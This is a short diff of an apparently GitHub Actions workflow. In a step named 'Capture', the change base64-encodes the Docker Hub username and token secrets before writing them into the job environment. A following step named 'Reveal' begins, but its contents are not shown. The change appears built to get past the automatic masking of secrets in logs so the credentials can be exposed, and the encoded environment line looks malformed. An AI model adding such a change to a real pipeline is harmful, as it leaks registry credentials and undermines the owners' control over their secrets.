@@ -22,8 +22,8 @@ jobs:
       
       - name: Capture
         run: |
-          echo "DOCKER_USERNAME=${{ secrets.DOCKER_USERNAME }}" >> $GITHUB_ENV
-          echo "DOCKERHUB_TOKEN=${{ secrets.DOCKERHUB_TOKEN }}" >> $GITHUB_ENV
+          echo "DOCKER_USERNAME=${{ secrets.DOCKER_USERNAME }}" | base64 >> $GITHUB_ENV
+          echo "DOCKERHUB_TOKEN=${{ secrets.DOCKERHUB_TOKEN }}" | base64 >> $GITHUB_ENV
 
       - name: Reveal
         run: |
